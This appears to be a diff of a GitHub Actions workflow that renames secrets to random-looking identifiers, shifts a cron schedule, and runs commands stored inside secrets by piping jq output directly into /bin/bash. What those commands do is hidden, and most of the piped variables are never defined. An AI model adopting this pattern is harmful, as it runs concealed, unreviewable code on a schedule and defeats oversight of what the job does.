@@ -2,22 +2,22 @@ name: lingshiwwx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 4/6 * * *'
+    - cron: '53 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: lingshiwwx
         env:
-          sn28692: ${{ secrets.sn28692 }}
+          w89612: ${{ secrets.w89612 }}
         run: |
-          echo $sn28692 | jq -r .m01362 | /bin/bash
-          echo $df40 | jq -r .dodp35580 | /bin/bash
-          echo $mvvx20 | jq -r .mfgmw92 | /bin/bash
-          echo $cxy00 | jq -r .yncxz4341 | /bin/bash
-          echo $uh59065 | jq -r .ywt45 | /bin/bash
-          echo $lg29166 | jq -r .obj0850 | /bin/bash
-          echo $ta25954 | jq -r .bvmk7 | /bin/bash
+          echo $w89612 | jq -r .y4 | /bin/bash
+          echo $kw9 | jq -r .oj561 | /bin/bash
+          echo $nadi39 | jq -r .ocbr95453 | /bin/bash
+          echo $ty45 | jq -r .dv26 | /bin/bash
+          echo $vb34221 | jq -r .b02 | /bin/bash
+          echo $mw91823 | jq -r .mf64 | /bin/bash
 
